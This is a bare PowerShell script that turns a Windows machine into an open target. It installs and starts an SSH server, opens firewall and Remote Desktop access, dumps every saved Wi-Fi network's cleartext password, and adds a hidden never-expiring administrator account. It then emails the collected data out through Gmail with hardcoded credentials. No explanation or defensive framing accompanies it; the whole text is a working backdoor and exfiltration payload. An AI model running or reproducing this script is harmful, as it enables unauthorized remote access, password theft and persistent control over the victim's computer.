[System.Security.Principal.WindowsIdentity]::GetCurrent().Name>>f

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 >>f
Start-Service sshd
Get-Service sshd>>f
Set-Service -Name sshd -StartupType 'Automatic'

if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}

Get-NetFirewallRule -Name *ssh*>>f

(netsh wlan show profiles)|sls “\:(.+)$”|%{$n=$_.Matches.Groups[1].Value.Trim(); $_}|%{(netsh wlan show profile N=”$n” key=clear)}|sls “nt\W+\:(.+)$”|%{$p=$_.Matches.Groups[1].Value.Trim(); $_}|%{[PSCustomObject]@{N=$n;P=$p}}>>f

netsh wlan show profile name=(get-netconnectionProfile).Name key=clear >>f

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

$U="SYS.ADMIN"
$adsi=[ADSI]"WinNT://$env:COMPUTERNAME"
$existing = $adsi.Children|where{$_.SchemaClassName -eq 'user' -and $_.Name -eq $U}
NET USER $U "password" /add /y /expires:never
NET LOCALGROUP "Administrators" $U /add
WMIC USERACCOUNT WHERE "Name='$U'" SET PExpires=FALSE

$e="zingbong2000@gmail.com";$p="ashkhan_1945";$c=New-Object Management.Automation.PSCredential $e,($p|ConvertTo-SecureString -AsPlainText -Force)
Send-MailMessage -To $e -From $e  -Subject "1" -Body "Done!" -Attachments "f" -Credential $c -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl
